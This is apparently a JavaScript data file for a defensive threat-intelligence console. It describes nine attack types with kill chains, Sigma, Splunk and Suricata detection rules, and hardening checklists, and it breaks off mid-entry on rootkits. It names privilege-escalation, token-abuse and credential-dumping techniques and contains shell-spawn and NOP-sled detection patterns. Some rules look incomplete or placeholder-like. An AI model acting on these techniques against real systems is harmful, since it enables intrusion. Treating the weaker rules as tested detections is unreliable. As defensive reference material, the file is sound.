/**
 * CYBER ATTACK BOOK - ENTERPRISE THREAT INTELLIGENCE & DEFENSE CONSOLE
 * Comprehensive Threat Dossiers across 8 Enterprise Security Domains (40 Vectors)
 */

const ATTACKS_DATA = [
  // =========================================================================
  // MODULE 1: NETWORK INFRASTRUCTURE ATTACKS (01 - 05)
  // =========================================================================
  {
    num: 1,
    id: "dos",
    name: "Denial-of-Service (DoS)",
    shortName: "DoS Attack",
    moduleGroup: "network",
    module: "Network Infrastructure Attacks",
    category: "dos",
    severity: "high",
    cvss: "7.5",
    mitre: "T1498, T1499",
    primaryTargets: "Web Servers, Network Firewalls, Single Hosts",
    threatActors: "Script Kiddies, Hacktivists, Disgruntled Employees",
    summary: "A Denial-of-Service (DoS) attack is an attempt to disrupt normal traffic of a targeted server, service, or network by overwhelming the target or its surrounding infrastructure with a flood of Internet traffic from a single source. Common methods include SYN floods, Ping of Death, and Slowloris.",
    killChain: [
      {
        step: 1,
        title: "Target Reconnaissance",
        mitre: "T1595",
        desc: "Identifying the target's IP address, open ports, and vulnerable services via port scanning."
      },
      {
        step: 2,
        title: "Resource Exhaustion Profiling",
        mitre: "T1595.002",
        desc: "Testing specific endpoints or protocols to determine which consume the most server resources (CPU, Memory, Connection Table)."
      },
      {
        step: 3,
        title: "Attack Execution (SYN Flood)",
        mitre: "T1498.001",
        desc: "Flooding the target with TCP SYN packets from a single IP, exhausting the operating system's connection queue."
      }
    ],
    telemetry: {
      sources: [
        "Network Firewalls / Routers (High ingress packet rate from single IP)",
        "Web Server Access Logs (Error 503 Service Unavailable)",
        "System Metrics (CPU/Memory utilization spikes, exhausted TCP sockets)"
      ],
      anomalies: [
        "Unusually high volume of traffic originating from a single IP address or subnet",
        "Thousands of half-open TCP connections (SYN_RECV state)",
        "Sudden spike in CPU/RAM usage with no corresponding legitimate user activity"
      ]
    },
    rules: {
      sigma: `title: Suspicious High Volume of Network Connections from Single IP
id: a2b8c9d1-3f5e-4c7a-9b1d-8e2f6a4c0b5d
status: experimental
description: Detects a potential DoS attack characterized by a high volume of connections from a single source IP within a short timeframe.
author: SOC Team
logsource:
    category: firewall
detection:
    selection:
        action: 'allowed'
    timeframe: 1m
    condition: selection | count(src_ip) > 10000
fields:
    - src_ip
    - dest_port
level: high
tags:
    - attack.impact
    - attack.t1498`,
      splunk: `index=firewall action=allowed
| bin _time span=1m
| stats count by src_ip, dest_ip
| where count > 10000
| eval Alert="Potential DoS: High connection rate from single IP"
| table _time, src_ip, dest_ip, count, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (
    msg:"SEC-ALERT Potential TCP SYN Flood DoS";
    flags:S;
    threshold: type both, track by_src, count 1000, seconds 1;
    classtype:denial-of-service;
    sid:1000001;
    rev:1;
)`,
      sysmon: `# Check for excessive SYN_RECV socket connections on server
netstat -n | awk '/^tcp/ {print $6}' | sort | uniq -c | sort -n`
    },
    defenseChecklist: [
      { id: "dos_1", title: "Rate Limiting", tier: "Network", desc: "Implement aggressive rate limiting per source IP on border firewalls and load balancers." },
      { id: "dos_2", title: "SYN Cookies", tier: "OS Level", desc: "Enable TCP SYN cookies in the operating system kernel to mitigate SYN flood connection exhaustion." },
      { id: "dos_3", title: "Connection Timeouts", tier: "Web Server", desc: "Configure short timeouts for half-open connections and idle HTTP sessions to mitigate Slowloris." },
      { id: "dos_4", title: "Ingress Filtering", tier: "Perimeter", desc: "Drop packets from bogon IPs and enforce strict un-spoofing (uRPF) rules." }
    ]
  },

  {
    num: 2,
    id: "ddos",
    name: "Distributed Denial-of-Service (DDoS)",
    shortName: "DDoS Attack",
    moduleGroup: "network",
    module: "Network Infrastructure Attacks",
    category: "dos",
    severity: "critical",
    cvss: "8.6",
    mitre: "T1498, T1499",
    primaryTargets: "Web Applications, Public API Gateways, DNS Resolvers, Corporate Edge",
    threatActors: "Killnet, Anonymous Sudan, Botnet Operators (Mirai)",
    summary: "A massive, distributed flood of traffic originating from thousands of compromised devices (botnets). Modern DDoS vectors combine high-volume L4 floods (UDP Amplification) with sophisticated Layer-7 attacks (HTTP/2 Rapid Reset) to overwhelm network pipes and backend CPUs.",
    killChain: [
      {
        step: 1,
        title: "Target Reconnaissance & Bottleneck Identification",
        mitre: "T1595",
        desc: "Attackers identify computationally expensive API endpoints or raw network capacity limits."
      },
      {
        step: 2,
        title: "Botnet Mobilization & C2 Trigger",
        mitre: "T1498",
        desc: "Distributing target URLs to thousands of compromised IoT nodes and cloud workers."
      },
      {
        step: 3,
        title: "Massive Distributed Traffic Flood",
        mitre: "T1499",
        desc: "The target is hit from thousands of unique IPs simultaneously, making simple IP blocking ineffective."
      }
    ],
    telemetry: {
      sources: [
        "CDN & Reverse Proxy Metrics (Requests/sec, Error rate)",
        "NetFlow / IPFIX (Ingress PPS, BPS, UDP volume)",
        "BGP Routing Logs (Route flapping due to link saturation)"
      ],
      anomalies: [
        "Sudden 100x surge in requests per second originating from diverse ASNs and geolocations",
        "Link saturation resulting in massive packet drop rates across edge routers",
        "Disproportionate spike in 502 Bad Gateway and 504 Gateway Timeout responses"
      ]
    },
    rules: {
      sigma: `title: Abnormal HTTP/2 RST_STREAM Rate Spike (L7 DDoS)
id: e49a3782-71c4-4b51-9029-47819ad77123
status: production
description: Detects rapid stream creation and reset pattern characteristic of HTTP/2 Rapid Reset attacks.
logsource:
    category: webserver
detection:
    selection:
        http_version: 'HTTP/2'
        rst_stream_count|gt: 500
    timeframe: 5s
    condition: selection
level: critical
tags:
    - attack.impact
    - attack.t1499.003`,
      splunk: `index=waf_logs action=allowed
| bin _time span=10s
| stats count as req_count, dc(client_ip) as unique_ips by _time
| where req_count > 50000 AND unique_ips > 1000
| eval Alert="Critical: Distributed L7 Flood in Progress"
| table _time, req_count, unique_ips, Alert`,
      suricata: `alert udp any any -> $HOME_NET 53 (
    msg:"SEC-ALERT High-Volume DNS Amplification / Reflection Flood";
    threshold: type both, track by_dst, count 5000, seconds 1;
    classtype:denial-of-service;
    sid:1000002;
    rev:1;
)`,
      sysmon: `# Query edge flow statistics for volumetric anomaly detection
show ip cache flow | sort -k 4 -n -r | head -n 20`
    },
    defenseChecklist: [
      { id: "ddos_1", title: "Anycast Cloud Scrubbing", tier: "Edge CDN", desc: "Deploy Cloudflare Magic Transit, AWS Shield Advanced, or Akamai Prolexic to absorb terabit-scale volumetric floods." },
      { id: "ddos_2", title: "Managed Challenge & CAPTCHA", tier: "WAF Layer", desc: "Enforce JavaScript computational challenges or turnstile verification on sudden traffic anomalies." },
      { id: "ddos_3", title: "BGP Blackholing (RTBH)", tier: "Network", desc: "Configure Remotely Triggered Black Hole routing to drop attack traffic at the ISP level." },
      { id: "ddos_4", title: "Infrastructure Auto-Scaling", tier: "Cloud", desc: "Configure elastic load balancing and auto-scaling groups to absorb moderate Layer 7 application floods." }
    ]
  },

  {
    num: 3,
    id: "mitm",
    name: "Man-in-the-Middle (MITM)",
    shortName: "MITM Attack",
    moduleGroup: "network",
    module: "Network Infrastructure Attacks",
    category: "mitm",
    severity: "high",
    cvss: "8.1",
    mitre: "T1557",
    primaryTargets: "Unencrypted Wi-Fi, Local LANs, Outdated TLS implementations",
    threatActors: "Insider Threats, Rogue Access Point Operators, State-Sponsored Espionage",
    summary: "An attack where the adversary secretly relays and alters the communications between two parties who believe they are directly communicating with each other. This allows attackers to intercept sensitive data, capture credentials, or inject malicious payloads.",
    killChain: [
      {
        step: 1,
        title: "Network Placement",
        mitre: "T1557.001",
        desc: "The attacker positions themselves logically between the victim and the gateway, often via rogue Wi-Fi or ARP spoofing."
      },
      {
        step: 2,
        title: "Traffic Interception",
        mitre: "T1040",
        desc: "Capturing packets in transit using promiscuous network sniffing tools."
      },
      {
        step: 3,
        title: "SSL Stripping / Downgrade",
        mitre: "T1557.001",
        desc: "Downgrading HTTPS connections to cleartext HTTP to capture plaintext credentials."
      }
    ],
    telemetry: {
      sources: [
        "Endpoint EDR (Detection of invalid or changed TLS certificates)",
        "Network Intrusion Detection Systems (IDS)",
        "Wireless Intrusion Prevention Systems (WIPS)"
      ],
      anomalies: [
        "Sudden certificate warnings on endpoints (invalid issuer)",
        "Traffic unexpectedly shifting from HTTPS to HTTP on sensitive portals",
        "Presence of rogue access points with BSSIDs mimicking corporate networks"
      ]
    },
    rules: {
      sigma: `title: Suspicious Certificate Authority (Possible MITM)
id: f1a2b3c4-d5e6-7f8g-9h0i-j1k2l3m4n5o6
status: experimental
description: Detects endpoint connections using an untrusted or newly injected root CA certificate.
logsource:
    category: network_connection
    product: windows
detection:
    selection:
        EventID: 3
        DestinationPort: 443
    condition: selection
level: medium
tags:
    - attack.credential_access
    - attack.t1557`,
      splunk: `index=network sourcetype=zeek_ssl
| stats dc(issuer) as num_issuers values(issuer) as issuers by server_name
| where num_issuers > 1 AND NOT match(issuers, "DigiCert|Let's Encrypt|GlobalSign")
| eval Alert="Potential MITM: Multiple/Untrusted SSL Issuers for same domain"
| table server_name, num_issuers, issuers, Alert`,
      suricata: `alert tls $EXTERNAL_NET any -> $HOME_NET any (
    msg:"SEC-ALERT Weak/Deprecated TLS Version Detected (Possible Downgrade)";
    tls.version:1.0,1.1;
    classtype:policy-violation;
    sid:1000003;
    rev:1;
)`,
      sysmon: `# Inspect Windows Root Certificate Store for newly injected root CAs
Get-ChildItem -Path Cert:\\LocalMachine\\Root | Where-Object {$_.NotAfter -gt (Get-Date).AddYears(10)}`
    },
    defenseChecklist: [
      { id: "mitm_1", title: "HSTS Enforcement", tier: "Web Server", desc: "Enforce HTTP Strict Transport Security via HTTP response headers with preload enabled." },
      { id: "mitm_2", title: "Certificate Pinning", tier: "Application", desc: "Implement certificate pinning in native applications to trust only predefined public keys." },
      { id: "mitm_3", title: "VPN / IPSec Tunnels", tier: "Network", desc: "Require Always-On VPN or IPsec tunnels for remote workers on untrusted networks." },
      { id: "mitm_4", title: "802.1X NAC", tier: "Wired/Wireless", desc: "Deploy 802.1X Network Access Control for mutual cryptographic authentication between endpoints and the switch." }
    ]
  },

  {
    num: 4,
    id: "arp-spoofing",
    name: "ARP Spoofing",
    shortName: "ARP Spoofing",
    moduleGroup: "network",
    module: "Network Infrastructure Attacks",
    category: "spoofing",
    severity: "medium",
    cvss: "6.5",
    mitre: "T1557.002",
    primaryTargets: "Local Area Networks (LAN), Ethernet Switches, Internal Hosts",
    threatActors: "Insider Threats, Compromised Internal Endpoints",
    summary: "Address Resolution Protocol (ARP) spoofing involves sending falsified ARP messages over a local area network. This links the attacker's MAC address with the IP address of a legitimate computer or server (often the default gateway) on the network, redirecting traffic to the attacker.",
    killChain: [
      {
        step: 1,
        title: "LAN Discovery",
        mitre: "T1046",
        desc: "Scanning the local subnet to identify active hosts and the IP address of the default gateway."
      },
      {
        step: 2,
        title: "ARP Cache Poisoning",
        mitre: "T1557.002",
        desc: "Continuously broadcasting forged ARP replies mapping the attacker's MAC to the Gateway's IP."
      },
      {
        step: 3,
        title: "Traffic Forwarding (MITM)",
        mitre: "T1040",
        desc: "Enabling IP forwarding so legitimate traffic still reaches the gateway while being captured."
      }
    ],
    telemetry: {
      sources: [
        "Network Switches (ARP Inspection Logs, MAC Flapping alerts)",
        "Endpoint ARP Cache Monitoring",
        "Network IDS (Suricata/Snort)"
      ],
      anomalies: [
        "MAC address flapping (the same IP address rapidly switching between two different MAC addresses on the switch)",
        "Multiple IP addresses resolving to a single physical MAC address",
        "Sudden spike in unsolicited ARP reply broadcasts"
      ]
    },
    rules: {
      sigma: `title: Local ARP Cache Poisoning Detection (Sysmon)
id: 5a6b7c8d-1e2f-3a4b-5c6d-7e8f9a0b1c2d
status: experimental
description: Detects anomalies in local ARP cache resolution if monitored via endpoint agents.
logsource:
    product: windows
    category: network_connection
tags:
    - attack.credential_access
    - attack.t1557.002`,
      splunk: `index=network sourcetype=switch_syslog "MAC flapping" OR "Host moved"
| stats count by mac_address, interface, ip_address
| where count > 10
| eval Alert="Warning: High rate of MAC flapping - Possible ARP Spoofing"
| table mac_address, interface, ip_address, count, Alert`,
      suricata: `alert arp any any -> any any (
    msg:"SEC-ALERT ARP Spoofing / Poisoning Attempt (Unsolicited Reply)";
    arp.opcode:2;
    threshold: type both, track by_src, count 50, seconds 10;
    classtype:attempted-recon;
    sid:1000004;
    rev:1;
)`,
      sysmon: `# Check ARP table for duplicate MAC mappings
arp -a | findstr "dynamic"`
    },
    defenseChecklist: [
      { id: "arp_1", title: "Dynamic ARP Inspection (DAI)", tier: "Switching", desc: "Enable DAI on enterprise switches to validate ARP packets against DHCP snooping bindings." },
      { id: "arp_2", title: "DHCP Snooping", tier: "Switching", desc: "Configure DHCP snooping to ensure only trusted switch ports can provide IP assignment." },
      { id: "arp_3", title: "Static ARP Entries", tier: "Critical Servers", desc: "Configure static ARP entries for critical infrastructure like default gateways." },
      { id: "arp_4", title: "Port Security", tier: "Switching", desc: "Limit the number of MAC addresses allowed per physical switch port to prevent MAC flooding." }
    ]
  },

  {
    num: 5,
    id: "dns-spoofing",
    name: "DNS Spoofing",
    shortName: "DNS Spoofing",
    moduleGroup: "network",
    module: "Network Infrastructure Attacks",
    category: "spoofing",
    severity: "high",
    cvss: "8.1",
    mitre: "T1568.002",
    primaryTargets: "Internal DNS Resolvers, Corporate Users, Mobile Workers",
    threatActors: "Phishing Campaigns, Nation-State Actors, Rogue DHCP Operators",
    summary: "DNS Spoofing (or DNS Cache Poisoning) involves altering DNS records to redirect traffic to a fraudulent website. Attackers intercept DNS requests and reply with forged IP addresses, silently redirecting users who typed the correct URL into their browser.",
    killChain: [
      {
        step: 1,
        title: "Interception / Cache Poisoning",
        mitre: "T1568.002",
        desc: "Attacker intercepts DNS UDP queries on the LAN or exploits vulnerabilities in older DNS resolvers to inject fake records."
      },
      {
        step: 2,
        title: "Traffic Redirection",
        mitre: "T1112",
        desc: "Victim's machine caches the forged DNS record and routes HTTP/HTTPS requests to the attacker's server."
      },
      {
        step: 3,
        title: "Credential Harvesting",
        mitre: "T1056",
        desc: "Attacker serves a clone of the requested site to harvest authentication tokens."
      }
    ],
    telemetry: {
      sources: [
        "DNS Server Logs (Unexpected zone transfers, excessive SERVFAILs)",
        "Endpoint EDR (DNS resolution monitoring)",
        "Network IDS (Mismatch between requested domain and expected IP ASNs)"
      ],
      anomalies: [
        "Internal corporate domains suddenly resolving to external, untrusted IP addresses",
        "Large volumes of DNS responses without matching outbound queries on the wire",
        "Rapid TTL modifications on critical DNS records"
      ]
    },
    rules: {
      sigma: `title: Suspicious DNS Resolution to Private IP
id: d7e8f9a0-b1c2-d3e4-f5a6-b7c8d9e0f1a2
status: experimental
description: Detects external public domains unexpectedly resolving to internal RFC1918 IP addresses.
logsource:
    category: dns
detection:
    selection:
        query|endswith: 
            - '.com'
            - '.net'
            - '.org'
        answer|startswith:
            - '10.'
            - '192.168.'
            - '172.16.'
    condition: selection
level: medium
tags:
    - attack.impact
    - attack.t1568.002`,
      splunk: `index=dns sourcetype=stream:dns
| stats values(answer) as IPs dc(answer) as IPCount by query
| where IPCount > 1 AND match(IPs, "^10\\.|^192\\.168\\.|^172\\.(1[6-9]|2[0-9]|3[0-1])\\.")
| eval Alert="Warning: Public Domain Resolved to Private IP - Possible Spoofing"
| table query, IPs, Alert`,
      suricata: `alert udp any 53 -> $HOME_NET any (
    msg:"SEC-ALERT Unsolicited DNS Response (Possible Cache Poisoning)";
    flow:from_server;
    flowbits:isnotset,dns.query.seen;
    classtype:attempted-admin;
    sid:1000005;
    rev:1;
)`,
      sysmon: `# Verify local DNS resolver configuration
ipconfig /displaydns | findstr "Record Name"`
    },
    defenseChecklist: [
      { id: "dns_1", title: "DNSSEC Implementation", tier: "DNS", desc: "Deploy DNS Security Extensions to digitally sign DNS records, ensuring cryptographic integrity." },
      { id: "dns_2", title: "DNS over HTTPS (DoH)", tier: "Endpoint", desc: "Enable DoH or DoT in enterprise browsers and operating systems to encrypt DNS queries." },
      { id: "dns_3", title: "Resolver Hardening", tier: "Infrastructure", desc: "Disable open recursion on internal DNS servers and enforce DNS source port randomization." },
      { id: "dns_4", title: "Hosts File Integrity", tier: "Endpoint", desc: "Monitor and alert on unauthorized modifications to the local operating system hosts file." }
    ]
  },

  // =========================================================================
  // MODULE 2: OPERATING SYSTEM ATTACKS (06 - 10)
  // =========================================================================
  {
    num: 6,
    id: "privilege-escalation",
    name: "Privilege Escalation",
    shortName: "Privilege Escalation",
    moduleGroup: "os",
    module: "Operating System Attacks",
    category: "privilege-escalation",
    severity: "critical",
    cvss: "8.8",
    mitre: "T1068, T1548, T1053",
    primaryTargets: "Windows Active Directory, Linux SUID Binaries, Kernel Drivers, Service Tokens",
    threatActors: "APT29 (Cozy Bear), FIN7, Lapsus$, Ransomware Operators",
    summary: "Privilege Escalation involves adversary techniques to circumvent security policies and acquire higher-level permissions on a compromised system. Attackers leverage OS kernel vulnerabilities, unquoted service paths, token impersonation privileges (such as SeImpersonatePrivilege via PrintSpoofer/GodPotato), misconfigured sudoers, or SUID capabilities to elevate from standard user to SYSTEM or root.",
    killChain: [
      {
        step: 1,
        title: "Local Privilege & Token Enumeration",
        mitre: "T1082",
        desc: "Adversary queries available privileges, groups, and misconfigured services on the compromised endpoint."
      },
      {
        step: 2,
        title: "Named Pipe / Token Impersonation",
        mitre: "T1134",
        desc: "Abusing SeImpersonatePrivilege via named pipes or RPC to coerce high-privileged SYSTEM tokens."
      },
      {
        step: 3,
        title: "High-Integrity Execution & Persistence",
        mitre: "T1059.003",
        desc: "Spawning an interactive command interpreter with NT AUTHORITY\\SYSTEM or root UID 0 permissions."
      }
    ],
    telemetry: {
      sources: [
        "Windows Security Event Log (Event ID 4672: Special privileges assigned to new logon)",
        "Sysmon (Event ID 1: Process creation by unusual elevated parents such as spoolsv.exe or services.exe)",
        "Linux Auditd (type=SYSCALL comm=\"sudo\" or euid=0 setuid transitions)"
      ],
      anomalies: [
        "Execution of cmd.exe or powershell.exe spawned directly by spoolsv.exe or non-standard service accounts",
        "Sudden privilege assignment of SeDebugPrivilege or SeImpersonatePrivilege to web service accounts",
        "Rapid execution of privilege escalation scripts (winPEAS, linpeas, Seatbelt)"
      ]
    },
    rules: {
      sigma: `title: Suspicious Process Spawning from Spooler or Web Service (PrivEsc)
id: c3d4e5f6-7a8b-9c0d-1e2f-3a4b5c6d7e8f
status: production
description: Detects command interpreter spawned by Spooler or IIS service indicating token impersonation privilege escalation.
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith:
            - '\\spoolsv.exe'
            - '\\w3wp.exe'
            - '\\sqlserver.exe'
        Image|endswith:
            - '\\cmd.exe'
            - '\\powershell.exe'
            - '\\pwsh.exe'
    condition: selection
fields:
    - ParentImage
    - Image
    - CommandLine
    - User
level: critical
tags:
    - attack.privilege_escalation
    - attack.t1548
    - attack.t1068`,
      splunk: `index=sysmon EventCode=1 
(ParentImage="*\\\\spoolsv.exe" OR ParentImage="*\\\\w3wp.exe") 
(Image="*\\\\cmd.exe" OR Image="*\\\\powershell.exe")
| eval Alert="CRITICAL: Shell spawned by Service Account - Probable Token Abuse PrivEsc"
| table _time, Computer, User, ParentImage, Image, CommandLine, Alert`,
      suricata: `alert tcp $HOME_NET any -> $EXTERNAL_NET any (
    msg:"SEC-ALERT Outbound Interactive Shell Traffic from System Service";
    content:"Microsoft Windows [Version";
    classtype:successful-admin;
    sid:1000006;
    rev:1;
)`,
      sysmon: `# Query Sysmon for shells spawned by system daemons
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} -MaxEvents 50 | 
  Where-Object {$_.Properties[21].Value -match 'spoolsv|w3wp'} | Select-Object TimeCreated, @{N='Parent';E={$_.Properties[21].Value}}`
    },
    defenseChecklist: [
      { id: "priv_1", title: "Strip SeImpersonate from Services", tier: "OS Hardening", desc: "Ensure IIS AppPool, MSSQL, and non-admin services do not hold SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege." },
      { id: "priv_2", title: "Enforce AppLocker / WDAC", tier: "Application Control", desc: "Prevent unauthorized binary execution in user-writable directories." },
      { id: "priv_3", title: "Audit SUID Binaries & Sudoers", tier: "Linux", desc: "Enforce strict sudo rules (avoid NOPASSWD: ALL) and strip SUID bits from unnecessary binaries." },
      { id: "priv_4", title: "Deploy LAPS", tier: "Identity", desc: "Eliminate shared local administrator passwords across enterprise workstations to stop lateral escalation." }
    ]
  },

  {
    num: 7,
    id: "buffer-overflow",
    name: "Buffer Overflow",
    shortName: "Buffer Overflow",
    moduleGroup: "os",
    module: "Operating System Attacks",
    category: "buffer-overflow",
    severity: "critical",
    cvss: "9.8",
    mitre: "T1203, T1211, CWE-120",
    primaryTargets: "C/C++ Network Daemons, OS Kernel Modules, Native Binaries, Legacy Services",
    threatActors: "Lazarus Group, Equation Group, Stuxnet Authors, Exploit Brokers",
    summary: "A Buffer Overflow occurs when a program writes more data to a memory buffer than it was allocated to hold. The excess data overruns into adjacent memory space, corrupting control data such as the stack frame pointer and return address (EIP/RIP). Adversaries exploit this condition to hijack program execution flow and execute arbitrary shellcode in the memory space of the victim process.",
    killChain: [
      {
        step: 1,
        title: "Memory Fuzzing & Fault Injection",
        mitre: "T1595.002",
        desc: "Adversary transmits oversized cyclic byte sequences to input buffers to trigger application crash."
      },
      {
        step: 2,
        title: "EIP/RIP Overwrite & Offset Calculation",
        mitre: "T1203",
        desc: "Identifying the exact byte offset to control instruction pointer and finding suitable jump gadgets."
      },
      {
        step: 3,
        title: "Shellcode Injection & Execution",
        mitre: "T1211",
        desc: "Delivering shellcode with NOP sled or Return-Oriented Programming (ROP) chain to bypass DEP/ASLR."
      }
    ],
    telemetry: {
      sources: [
        "Windows Error Reporting (WER) / Application Event Log (Event ID 1000: Application Error with Exception Code 0xc0000005 - Access Violation)",
        "Linux dmesg / /var/log/messages (segfault at address rip ... error 4/6 in libc.so)",
        "EDR Exploit Mitigation Logs (Arbitrary Code Guard or StackPivot triggers)"
      ],
      anomalies: [
        "Recurrent crashes of critical services with unhandled access violations",
        "Native process executing instructions in non-executable memory segments (NX/DEP violation)",
        "Unexpected child processes (cmd.exe, /bin/sh) spawned directly from network daemon listeners"
      ]
    },
    rules: {
      sigma: `title: Application Crash Followed by Shell Spawn (Buffer Overflow Exploit)
id: 8f9e0a1b-2c3d-4e5f-6a7b-8c9d0e1f2a3b
status: production
description: Detects an application crash event immediately followed by command shell creation from a native listening service.
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith:
            - '\\inetinfo.exe'
            - '\\httpd.exe'
            - '\\mysqld.exe'
        Image|endswith:
            - '\\cmd.exe'
            - '\\powershell.exe'
    condition: selection
level: critical
tags:
    - attack.execution
    - attack.t1203`,
      splunk: `index=wineventlog EventCode=1000 ExceptionCode="0xc0000005"
| stats count by AppName, ExceptionOffset, Computer
| eval Alert="CRITICAL: Repeated Access Violation Memory Fault - Potential Exploitation"
| table _time, Computer, AppName, ExceptionOffset, count, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET any (
    msg:"SEC-ALERT Potential NOP Sled / Buffer Overflow Payload Detected";
    content:"|90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90|";
    threshold: type both, track by_src, count 5, seconds 30;
    classtype:attempted-admin;
    sid:1000007;
    rev:1;
)`,
      sysmon: `# Inspecting recent application faults in Windows PowerShell:
Get-WinEvent -FilterHashtable @{LogName='Application'; ProviderName='Application Error'} -MaxEvents 5 | Format-List`
    },
    defenseChecklist: [
      { id: "bov_1", title: "Enable ASLR & DEP Globally", tier: "OS Level", desc: "Enforce Address Space Layout Randomization (ASLR) and Hardware DEP globally via Exploit Protection." },
      { id: "bov_2", title: "Compile with Stack Canaries", tier: "Development", desc: "Recompile native applications with Stack Smashing Protection (-fstack-protector-all), SafeSEH, and Control Flow Guard (CFG)." },
      { id: "bov_3", title: "Adopt Memory-Safe Languages", tier: "Architecture", desc: "Migrate legacy C/C++ services to memory-safe languages (Rust, Go, Modern C++ with safe pointer abstractions)." },
      { id: "bov_4", title: "Seccomp & Sandboxing", tier: "Runtime", desc: "Restrict available system calls for network daemons using Seccomp-BPF profiles and non-root execution." }
    ]
  },

  {
    num: 8,
    id: "password-attack",
    name: "Password Attack (Brute Force & Spraying)",
    shortName: "Password Attack",
    moduleGroup: "os",
    module: "Operating System Attacks",
    category: "password-attack",
    severity: "high",
    cvss: "8.1",
    mitre: "T1110, T1110.001, T1110.003, T1003",
    primaryTargets: "Active Directory (Kerberos/NTLM), SSH Daemons, RDP Gateways, VPN Portals, Local SAM",
    threatActors: "Scattered Spider, LockBit Affiliates, Midnight Blizzard, Automated Botnets",
    summary: "Password attacks encompass brute-force, credential stuffing, password spraying, and offline hash cracking used to compromise authentication systems. Adversaries employ password spraying—attempting a single common password (e.g., 'SeasonYear!') against thousands of domain user accounts—to bypass account lockout thresholds while evading traditional brute-force detection rules.",
    killChain: [
      {
        step: 1,
        title: "Domain User List Harvesting",
        mitre: "T1087.002",
        desc: "Harvesting active employee usernames via open LDAP, SMB null sessions, or LinkedIn OSINT."
      },
      {
        step: 2,
        title: "Low & Slow Password Spray Execution",
        mitre: "T1110.003",
        desc: "Testing one high-probability password against every harvested account at 30-minute intervals."
      },
      {
        step: 3,
        title: "Offline Password Hash Cracking",
        mitre: "T1003.001",
        desc: "Once elevated, extracting local SAM hashes or dumping LSASS memory to crack passwords offline via Hashcat."
      }
    ],
    telemetry: {
      sources: [
        "Windows Security Event Log (Event ID 4625: An account failed to log on with Failure Reason 0xC000006A)",
        "Windows Event ID 4771 / 4768 (Kerberos Pre-Authentication failure)",
        "Linux /var/log/auth.log ('Failed password for invalid user')"
      ],
      anomalies: [
        "A single source IP failing logon against dozens of unique usernames within a short timeframe",
        "Logon attempts at abnormal hours followed immediately by successful 4624 Type 3 logon",
        "High frequency of Kerberos error 0x18 (Pre-authentication failed) across multiple domain accounts"
      ]
    },
    rules: {
      sigma: `title: Potential Password Spraying Attack Across Multiple Accounts
id: b4c5d6e7-8f9a-0b1c-2d3e-4f5a6b7c8d9e
status: production
description: Detects failure events from a single IP targeting multiple distinct user accounts within 5 minutes.
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4625
        SubStatus: '0xc000006a'
    timeframe: 5m
    condition: selection | count(TargetUserName) by IpAddress > 10
fields:
    - IpAddress
    - TargetUserName
    - SubStatus
level: high
tags:
    - attack.credential_access
    - attack.t1110.003`,
      splunk: `index=wineventlog EventCode=4625 SubStatus="0xc000006a"
| bin _time span=5m
| stats dc(TargetUserName) as distinct_users values(TargetUserName) as targeted_users count by IpAddress, _time
| where distinct_users > 10
| eval Alert="HIGH: Password Spray Detected (>10 accounts from single IP)"
| table _time, IpAddress, distinct_users, targeted_users, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (
    msg:"SEC-ALERT Multiple SSH Failed Login Attempts (Brute Force)";
    flow:established,to_server;
    threshold: type both, track by_src, count 20, seconds 60;
    classtype:attempted-user;
    sid:1000008;
    rev:1;
)`,
      sysmon: `# Query top failed logon source IPs
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 500 | 
  Group-Object {$_.Properties[19].Value} | Sort-Object Count -Descending | Select-Object -First 10 Count, Name`
    },
    defenseChecklist: [
      { id: "pwd_1", title: "Phishing-Resistant MFA", tier: "Identity", desc: "Deploy FIDO2 WebAuthn or smart cards to render intercepted passwords insufficient for authentication." },
      { id: "pwd_2", title: "Smart Lockout & Banned Passwords", tier: "Active Directory", desc: "Implement Azure AD Password Protection to block common passwords and spray attacks without lockout denial." },
      { id: "pwd_3", title: "Disable NTLM", tier: "Network", desc: "Decommission legacy NTLMv1/v2 where possible to prevent offline cracking and pass-the-hash attacks." },
      { id: "pwd_4", title: "Deploy Credential Guard", tier: "Endpoint", desc: "Enable Virtualization-Based Security Credential Guard to prevent memory dumping of LSASS tokens." }
    ]
  },

  {
    num: 9,
    id: "rootkit-attack",
    name: "Rootkit Attack",
    shortName: "Rootkit Attack",
    moduleGroup: "os",
    module: "Operating System Attacks",
    category: "rootkit-attack",
    severity: "critical",
    cvss: "9.4",
    mitre: "T1014, T1547.006, T1562",
    primaryTargets: "OS Kernel (Ring 0), Hypervisors (Ring -1), UEFI / BIOS Firmware, System Call Tables",
    threatActors: "Turla, Sandworm, Equation Group, Stuxnet Authors, North Korean State Actors",
    summary: "A Rootkit is a stealthy malicious payload designed to maintain persistent, privileged, and undetected access to an operating system. By hooking kernel functions (SSDT/IDT), modifying Direct Kernel Objects (DKOM), or exploiting vulnerable signed third-party drivers (BYOVD), rootkits conceal their files, network connections, and processes directly from user-space monitoring tools and security agents.",
    killChain: [
      {
        step: 1,
        title: "Bring-Your-Own-Vulnerable-Driver (BYOVD)",
        mitre: "T1068",
        desc: "Dropping a legitimately signed third-party driver with known write-what-where kernel vulnerabilities."
      },
      {
        step: 2,
        title: "Kernel Object Manipulation & EDR Blindspot",
        mitre: "T1014",
        desc: "Using the driver vulnerability to unhook EDR kernel callbacks (ObRegisterCallbacks) and zero out process tokens."
      },
      {
        step: 3,
        title: "Process & Network Port Cloaking",
        mitre: "T1547.006",
        desc: "Unhooking OS query APIs to render attacker C2 connections and backdoor threads completely invisible to netstat and Task Manager."
      }
    ],
    telemetry: {
      sources: [
        "System Event Log (Event ID 7045: A new service was installed in the system - Service Type: kernel driver 0x1)",
        "Sysmon (Event ID 6: Driver loaded with unsigned or anomalous certificate hash)",
        "Hardware TPM / Secure Boot measurement logs (PCR registers discrepancy)"
      ],
      anomalies: [
        "Installation of kernel drivers with expired, revoked, or untrusted digital certificates",
        "Discrepancy between low-level memory scans (Volatility) and user-mode process listings (Task Manager)",
